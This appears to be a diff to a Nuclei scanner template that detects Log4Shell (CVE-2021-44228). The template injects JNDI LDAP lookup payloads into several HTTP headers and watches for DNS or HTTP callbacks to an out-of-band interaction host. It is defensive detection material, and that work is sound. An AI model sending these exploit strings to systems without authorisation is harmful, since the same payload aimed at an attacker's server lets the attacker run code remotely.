@@ -5,21 +5,20 @@ info:
   author: bin3xish477
   severity: high
   description: This scripts inject JNDI payloads into several HTTP headers and attempts to detect OOB interactions with interactsh
-  tags: log4j,cve,rce
   reference:
-    - https://github.com/Cybereason/Logout4Shell.git
+    - "https://github.com/Cybereason/Logout4Shell"
 
 requests:
   - method: GET
     path:
-      - "/"
+      - "{{BaseURL}}"
     headers:
-      User-Agent: "${jndi:ldap://{{interactsh-url}}}"
-      Server-IP: "${jndi:ldap://{{interactsh-url}}}"
-      X-Forwarding: "${jndi:ldap://{{interactsh-url}}}"
+      User-Agent: "${jndi:ldap://{{interactsh-url}}/x}"
+      Server-IP: "${jndi:ldap://{{interactsh-url}}/x}"
+      X-Forwarding: "${jndi:ldap://{{interactsh-url}}/x}"
     matchers:
-      type: word
-      part: interactsh_protocol
-      words:
-        - "dns"
-        - "http"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
